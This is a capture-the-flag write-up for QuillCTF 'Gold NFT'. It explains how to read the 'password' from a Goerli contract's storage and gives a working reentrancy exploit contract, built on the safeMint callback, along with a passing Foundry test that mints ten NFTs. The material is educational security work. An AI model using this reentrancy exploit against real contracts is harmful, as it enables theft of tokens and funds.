# QuillCTF : Gold NFT

## Objective of CTF

Retrieve the password from IPassManager and mint at least 10 NFTs.

### Contract code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC721} from "lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";

interface IPassManager {
    function read(bytes32) external returns (bool);
}

contract GoldNFT is ERC721("GoldNFT", "GoldNFT") {
    uint lastTokenId;
    bool minted;

    function takeONEnft(bytes32 password) external {
        require(
            IPassManager(0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2).read(
                password
            ),
            "wrong pass"
        );

        if (!minted) {
            lastTokenId++;
            _safeMint(msg.sender, lastTokenId);
            minted = true;
        } else revert("already minted");
    }
}
```

It's calling `read()` on 0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2 in goerli

We can decompile it to see what it's doing :
https://goerli.etherscan.io/bytecode-decompiler?a=0xe43029d90b47dd47611bad91f24f87bc9a03aec2

It's basically just taking that password as the storage slot and read a boolean from that slot

On the contract creation transaction, we can see that the storage slot `0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe` is changed to `0x0000000000000000000000000000000000000000000000000000000000000001`

https://goerli.etherscan.io/tx/0x88fc0f1dd855405d092fc408c3311e7131477ec201f39344c4f002371c23f81c#statechange

So we can just set our password to `0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe`

Then we have to mint 10 NFT, however it will check for `minted`, and after the mint, it will change `minted` to true, so we can't mint again

But it is using `safeMint()` which is vulnerable to reentrancy, also it is not using checks-effects-interactions pattern, so we can do reentrancy to get 10 NFT

### Exploit contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC721} from "lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";
import "./GoldNFT.sol";

contract HackGoldNft {
    uint256 i;

    function exploit(address addr) external {
        GoldNFT(addr).takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
        for (uint id = 1; id < 11; ++id) {
            GoldNFT(addr).transferFrom(address(this), msg.sender, id);
        }
    }
    
    function onERC721Received(address,address,uint256,bytes memory) public returns (bytes4) {
        i += 1;
        if (i < 11) {
            GoldNFT(msg.sender).takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
        }
        return this.onERC721Received.selector;
    }

}
```

## Proof of concept

### Foundry test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/GoldNFT.sol";
import "../src/GoldNFTExploit.sol";

contract Hack is Test {
    GoldNFT nft;
    HackGoldNft nftHack;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.createSelectFork("goerli", 8591866); 
        nft = new GoldNFT();
    }

    function test_Attack() public {
        vm.startPrank(hacker);
        // solution
        nftHack = new HackGoldNft();
        nftHack.exploit(address(nft));
        
        assertEq(nft.balanceOf(hacker), 10);
    }
}
```

### Foundry test output

```
# forge test --match-path test/GoldNFT.t.sol -vv
[⠒] Compiling...
No files changed, compilation skipped

Running 1 test for test/GoldNFT.t.sol:Hack
[PASS] test_Attack() (gas: 781405)
Test result: ok. 1 passed; 0 failed; finished in 139.37ms
```